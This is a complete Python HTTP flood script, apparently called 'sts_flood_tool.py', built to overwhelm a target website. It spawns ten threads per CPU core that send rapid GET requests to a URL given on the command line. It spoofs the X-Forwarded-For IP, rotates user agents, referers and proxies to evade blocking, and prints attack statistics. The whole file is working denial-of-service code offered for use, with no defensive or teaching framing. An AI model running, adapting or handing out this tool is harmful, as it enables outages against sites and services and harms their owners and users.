import requests
import random
import threading
import time
import sys
import os
from multiprocessing import cpu_count

# Load files
def load_lines(filename):
    try:
        with open(filename, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return []

user_agents = load_lines("ua.txt") or ["Mozilla/5.0"]
referers = load_lines("refs.txt") or ["https://google.com"]
proxies = load_lines("proxy.txt")

# Generate random spoofed IP
def random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

# Worker to send a single request
def send_single(target, results):
    headers = {
        "User-Agent": random.choice(user_agents),
        "Referer": random.choice(referers),
        "X-Forwarded-For": random_ip(),
        "Accept-Language": random.choice([
            "en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.7"
        ]),
        "Upgrade-Insecure-Requests": "1",
        "Connection": "keep-alive",
    }

    proxy = random.choice(proxies) if proxies else None
    proxy_dict = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}",
    } if proxy else None

    try:
        res = requests.get(target, headers=headers, proxies=proxy_dict, timeout=2)
        with results["lock"]:
            results["sent"] += 1
            if res.status_code in [200, 301, 302, 403]:
                results["success"] += 1
            else:
                results["failed"] += 1
    except:
        with results["lock"]:
            results["sent"] += 1
            results["failed"] += 1

def start_attack(target, total_requests):
    threads = []
    results = {
        "sent": 0,
        "success": 0,
        "failed": 0,
        "lock": threading.Lock()
    }

    max_threads = cpu_count() * 10
    start_time = time.time()

    def thread_manager():
        while results["sent"] < total_requests:
            active = threading.active_count()
            if active < max_threads:
                t = threading.Thread(target=send_single, args=(target, results))
                t.start()
                threads.append(t)
            else:
                time.sleep(0.001)

    thread_manager()

    for t in threads:
        t.join()

    end_time = time.time()
    duration = round(end_time - start_time, 2)
    peak_rps = round(results["sent"] / duration, 2)

    print("\n--- STS FLOOD COMPLETE ---")
    print(f"Target: {target}")
    print(f"Total sent:  {results['sent']}")
    print(f"Success:     {results['success']}")
    print(f"Failed:      {results['failed']}")
    print(f"Peak RPS:    {peak_rps}")
    print(f"Time Taken:  {duration} seconds")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python sts_flood_tool.py https://target.com [request_count]")
        sys.exit(1)

    target_url = sys.argv[1]
    total_requests = int(sys.argv[2]) if len(sys.argv) > 2 else 1200

    print(f"Launching attack on: {target_url}")
    print(f"Using {cpu_count()} cores x10 threads")
    print(f"Request count: {total_requests}")
    print(f"User-Agents loaded: {len(user_agents)}")
    print(f"Refs loaded: {len(referers)}")
    print(f"Proxies loaded: {len(proxies)}")

    start_attack(target_url, total_requests)
